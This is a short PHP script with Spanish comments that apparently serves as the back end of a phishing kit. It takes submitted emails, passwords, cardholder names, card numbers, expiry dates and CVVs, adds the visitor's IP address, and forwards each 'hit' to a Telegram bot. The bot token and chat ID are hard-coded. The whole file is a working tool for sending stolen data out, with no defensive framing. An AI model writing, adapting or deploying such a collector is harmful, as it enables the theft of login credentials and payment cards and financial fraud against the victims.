<?php
// Configuración de tu Bot
$token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
$chat_id = "7993722214";

// Recibir los datos del formulario
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $mensaje = "🔔 NUEVO HIT 🔔\n\n";
    $mensaje .= "📧 Correo: " . $data['em'] . "\n";
    $mensaje .= "🔑 Pass: " . $data['pw'] . "\n";
    $mensaje .= "👤 Titular: " . $data['nm'] . "\n";
    $mensaje .= "💳 Tarjeta: " . $data['cc'] . "\n";
    $mensaje .= "📅 Exp: " . $data['ex'] . "\n";
    $mensaje .= "🔒 CVV: " . $data['cv'] . "\n";
    $mensaje .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'];

    // Enviar a Telegram vía CURL (Servidor a Servidor)
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chat_id, 'text' => $mensaje]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    echo json_encode(["status" => "ok"]);
}
?>
